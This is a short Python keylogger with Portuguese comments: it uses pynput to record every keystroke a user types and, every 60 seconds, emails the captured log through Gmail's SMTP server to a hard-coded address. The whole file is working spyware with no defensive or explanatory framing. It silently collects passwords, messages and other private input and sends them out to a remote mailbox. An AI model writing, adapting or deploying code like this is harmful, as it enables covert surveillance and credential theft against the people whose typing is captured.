from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

#CONFIGURAÇÃO DE E-MAIL
EMAIL_ORIGEM = "zerofill@protonmail.com"
EMAIL_DESTINO = "zerofill@protonmail.com"
SENHA_EMAIL = "{{app_password}}"

log = ""

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit
        except Exception as e:
            print("Erro ao enviar email", e)

    #AGENDAR O ENVIO A CADA 60 SEGUNDOS
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        elif key == keyboard.Key.esc:
            log += "[ESC]"
        else:
            pass # IGNORAR CTRL, SHIFT, ALT...

#INICIAR O KEYLOGGER E O ENVIO AUTOMÁTICO
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()